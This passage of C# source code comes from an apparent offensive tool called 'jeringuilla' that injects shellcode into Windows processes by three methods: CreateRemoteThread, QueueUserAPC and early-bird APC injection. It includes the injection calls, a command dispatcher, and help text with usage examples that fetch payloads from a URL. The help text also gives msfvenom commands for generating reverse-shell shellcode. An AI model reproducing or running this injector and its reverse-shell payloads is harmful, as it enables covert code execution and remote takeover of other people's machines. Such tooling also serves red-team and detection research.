            Console.WriteLine("[+] Process PID: " + pi.dwProcessId);
            Console.WriteLine("[+] Thread ID:   " + pi.dwThreadId);
            var baseAddress = auxVirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x20);
            auxWriteProcessMemory(pi.hProcess, baseAddress, buf, buf.Length, out _);
            auxQueueUserAPC(baseAddress, pi.hThread, 0);
            auxResumeThread(pi.hThread);
        }


        static void listInfo(Dictionary<string, string> processPIDs)
        {
            Console.WriteLine("{0,40} | {1,10} | {2,20}", "Process Name", "PID", "Process Owner");
            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 80)));
            foreach (KeyValuePair<string, string> kvp in processPIDs)
            {
                Console.WriteLine("{0,40} | {1,10} | {2,20}", Process.GetProcessById(Int32.Parse(kvp.Key)).ProcessName, kvp.Key, kvp.Value);
            }
        }


        static void getHelp()
        {
            Console.WriteLine("       _           _                   _ _ _       \r\n      | |         (_)                 (_) | |      \r\n      | | ___ _ __ _ _ __   __ _ _   _ _| | | __ _ \r\n  _   | |/ _ \\ '__| | '_ \\ / _` | | | | | | |/ _` |\r\n | |__| |  __/ |  | | | | | (_| | |_| | | | | (_| |\r\n  \\____/ \\___|_|  |_|_| |_|\\__, |\\__,_|_|_|_|\\__,_|\r\n                            __/ |                  \r\n                           |___/        \n");

            Console.WriteLine("[+] Option \"list\" to  enumerate all processes or filter by name or owner.");
            Console.WriteLine("jeringuilla.exe list [ all | PROCESS_NAME | PROCESS_OWNER]\r\n");
            Console.WriteLine("[*] Example - List all processes:");
            Console.WriteLine("jeringuilla.exe list all");
            Console.WriteLine("[*] Example - List processes with a specific name (\"explorer\") or process owner (\"DESKTOP-MA54241\\ricardo\"):");
            Console.WriteLine("jeringuilla.exe list explorer\r\njeringuilla.exe list \"DESKTOP-MA54241\\ricardo\"\n\n");

            Console.WriteLine("[+] Injection type \"inject-crt\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)");
            Console.WriteLine("jeringuilla.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
            Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
            Console.WriteLine("jeringuilla.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
            Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
            Console.WriteLine("jeringuilla.exe inject-crt 1234 http://127.0.0.1/payload.bin\n\n");

            Console.WriteLine("[+] Injection type \"inject-apc\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)");
            Console.WriteLine("jeringuilla.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
            Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
            Console.WriteLine("jeringuilla.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
            Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
            Console.WriteLine("jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin\n\n");

            Console.WriteLine("[+] Injection type \"earlybird\" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)");
            Console.WriteLine("jeringuilla.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]\r\n");
            Console.WriteLine("[*] Example - Injection using program path and payload in HEX format:");
            Console.WriteLine("jeringuilla.exe earlybird \"c:\\windows\\system32\\notepad.exe\" fc4883e4f0e8...");
            Console.WriteLine("[*] Example - Injection using program path and a url to download the payload:");
            Console.WriteLine("jeringuilla.exe earlybird \"c:\\windows\\system32\\calc.exe\" http://127.0.0.1/payload.bin\n\n");

            Console.WriteLine("[+] Payload generation");
            Console.WriteLine("[*] Example - Create payload in HEX format using Msfvenom with:");
            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'");
            Console.WriteLine("[*] Example - Create payload in raw format for url option using Msfvenom with:");
            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin");

            System.Environment.Exit(0);
        }


        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                getHelp();
            }

            string option = args[0];
            string process_str = args[1];

            if (option == "list")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                listInfo(processPIDs);

            }

            else if (option == "inject-crt")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeCreateRemoteThread(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeCreateRemoteThread(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "inject-apc")
            {
                Dictionary<string, string> processPIDs = getProcessPids(process_str);
                var isNumeric = int.TryParse(process_str, out int n);
                if (isNumeric)
                {
                    string payload;
                    if (args.Length == 3)
                    {
                        payload = args[2];
                    }
                    else
                    {
                        payload = null;
                    }
                    injectShellcodeQueueUserAPC(process_str, payload);
                }
                else
                {
                    string username_str = args[2];
                    string payload;
                    if (args.Length == 4)
                    {
                        payload = args[3];
                    }
                    else
                    {
                        payload = null;
                    }

                    foreach (KeyValuePair<string, string> kvp in processPIDs)
                    {
                        if (kvp.Value == username_str)
                        {
                            injectShellcodeQueueUserAPC(kvp.Key, payload);
                            break;
                        }
                    }
                }
            }

            else if (option == "earlybird")
            {
                string payload;
                if (args.Length == 3)
                {
                    payload = args[2];
                }
                else
                {
                    payload = null;
                }
                injectShellcodeEarlyBird(process_str, payload);
            }
        }

    }

}